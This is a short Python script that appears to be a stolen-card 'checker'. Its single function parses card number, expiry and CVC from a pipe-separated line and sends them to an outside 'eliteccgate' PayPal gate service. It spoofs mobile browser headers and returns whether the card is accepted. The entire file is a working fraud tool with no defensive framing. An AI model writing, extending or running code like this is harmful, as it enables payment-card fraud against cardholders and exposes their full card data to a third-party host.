import requests

def PayPal_1(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            return "INVALID_FORMAT"
        n = parts[0].strip()
        mm = parts[1].strip().zfill(2)
        yy = parts[2].strip()
        cvc = parts[3].strip()
        if len(yy) == 4:
            yy = yy[2:]
        card_data = f"{n}|{mm}|{yy}|{cvc}"
        url = f"https://eliteccgate.vercel.app/paypal?cc={card_data}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://eliteccgate.vercel.app/',
            'Origin': 'https://eliteccgate.vercel.app'
        }
        response = requests.get(url, headers=headers, timeout=30)
        try:
            data = response.json()
            for key in ['response', 'message', 'result', 'status', 'error']:
                if key in data and data[key]:
                    return str(data[key])
            return response.text
        except:
            return response.text if response.text else "NO_RESPONSE"
    except requests.exceptions.Timeout:
        return "TIMEOUT"
    except requests.exceptions.ConnectionError:
        return "CONNECTION_ERROR"
    except Exception as e:
        return f"Error: {str(e)}"

PayPal = PayPal_1
